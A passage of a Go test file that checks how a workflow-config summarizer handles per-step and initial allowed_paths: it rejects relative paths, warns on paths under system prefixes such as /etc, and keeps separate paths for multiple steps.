	path := filepath.Join(dir, "wf.json")
	mustWriteFile(t, path, `{
		"initial": {
			"prompt": "do the thing",
			"allowed_paths": [
				{"path": "relative/path", "mode": "read_write"}
			]
		}
	}`)

	_, err := Summarize(path)
	if err == nil {
		t.Fatal("expected parse error for malformed initial-level allowed_path; got nil")
	}
	// Error should identify the scope and index.
	if !strings.Contains(err.Error(), "initial") {
		t.Fatalf("error should mention 'initial' scope, got: %v", err)
	}
	if !strings.Contains(err.Error(), "allowed_paths[0]") {
		t.Fatalf("error should identify allowed_paths[0] index, got: %v", err)
	}
	if !strings.Contains(err.Error(), "absolute") {
		t.Fatalf("error should mention 'absolute', got: %v", err)
	}
}

// TestSummarize_StepAllowedPaths_SystemPrefixWarning verifies that a step-level
// allowed_path under a system prefix generates a warning in the summary.
func TestSummarize_StepAllowedPaths_SystemPrefixWarning(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "wf.json")
	mustWriteFile(t, path, `{
		"initial": {"prompt": "do the thing"},
		"steps": [
			{
				"prompt": "process data",
				"allowed_paths": [
					{"path": "/etc/sprout-stuff", "mode": "read_only"}
				]
			}
		]
	}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	if len(s.Warnings) == 0 {
		t.Fatal("expected at least one warning for system prefix path")
	}
	found := false
	for _, w := range s.Warnings {
		if strings.Contains(w, "step") && strings.Contains(w, "/etc/sprout-stuff") && strings.Contains(w, "system prefix") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected warning about step-level system prefix path, got: %v", s.Warnings)
	}
}

// TestSummarize_InitialAllowedPaths_SystemPrefixWarning verifies that an initial-level
// allowed_path under a system prefix generates a warning in the summary.
func TestSummarize_InitialAllowedPaths_SystemPrefixWarning(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "wf.json")
	mustWriteFile(t, path, `{
		"initial": {
			"prompt": "do the thing",
			"allowed_paths": [
				{"path": "/etc/sprout-stuff", "mode": "read_only"}
			]
		}
	}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	if len(s.Warnings) == 0 {
		t.Fatal("expected at least one warning for system prefix path")
	}
	found := false
	for _, w := range s.Warnings {
		if strings.Contains(w, "initial") && strings.Contains(w, "/etc/sprout-stuff") && strings.Contains(w, "system prefix") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected warning about initial-level system prefix path, got: %v", s.Warnings)
	}
}

// TestSummarize_StepAllowedPaths_MultipleSteps verifies that Summarize correctly
// handles multiple steps with their own allowed_paths.
func TestSummarize_StepAllowedPaths_MultipleSteps(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "wf.json")
	mustWriteFile(t, path, `{
		"initial": {"prompt": "do the thing"},
		"steps": [
			{
				"name": "step1",
				"prompt": "first step",
				"allowed_paths": [
					{"path": "/tmp/step1", "mode": "read_write"}
				]
			},
			{
				"name": "step2",
				"prompt": "second step",
				"allowed_paths": [
					{"path": "/tmp/step2", "mode": "read_only"}
				]
			}
		]
	}`)

	s, err := Summarize(path)
	if err != nil {
		t.Fatalf("Summarize: %v", err)
	}
	if len(s.Steps) != 2 {
		t.Fatalf("expected 2 steps, got %d", len(s.Steps))
	}
	if len(s.Steps[0].AllowedPaths) != 1 {
		t.Errorf("step 0 expected 1 allowed_path, got %d", len(s.Steps[0].AllowedPaths))
	}
	if s.Steps[0].AllowedPaths[0].Path != "/tmp/step1" {
		t.Errorf("step 0 allowed_path: got %q, want /tmp/step1", s.Steps[0].AllowedPaths[0].Path)
	}
	if len(s.Steps[1].AllowedPaths) != 1 {
		t.Errorf("step 1 expected 1 allowed_path, got %d", len(s.Steps[1].AllowedPaths))
	}
	if s.Steps[1].AllowedPaths[0].Path != "/tmp/step2" {
		t.Errorf("step 1 allowed_path: got %q, want /tmp/step2", s.Steps[1].AllowedPaths[0].Path)
	}
}
